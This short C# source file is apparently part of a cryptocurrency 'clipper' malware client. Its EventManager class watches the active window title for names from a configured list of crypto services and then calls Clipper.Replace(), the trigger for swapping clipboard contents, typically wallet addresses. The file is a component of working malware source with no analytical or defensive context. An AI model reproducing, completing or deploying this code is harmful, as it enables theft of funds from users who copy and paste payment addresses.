using Client.Modules.Manager;

namespace Client.Modules.Clipper;

internal sealed class EventManager
{
	public static void Action()
	{
		if (Detect())
		{
			Clipper.Replace();
		}
	}

	private static bool Detect()
	{
		string[] cryptoServices = Config.CryptoServices;
		int num = 0;
		while (true)
		{
			if (num < cryptoServices.Length)
			{
				string value = cryptoServices[num];
				if (WindowManager.ActiveWindow.ToLower().Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}
}
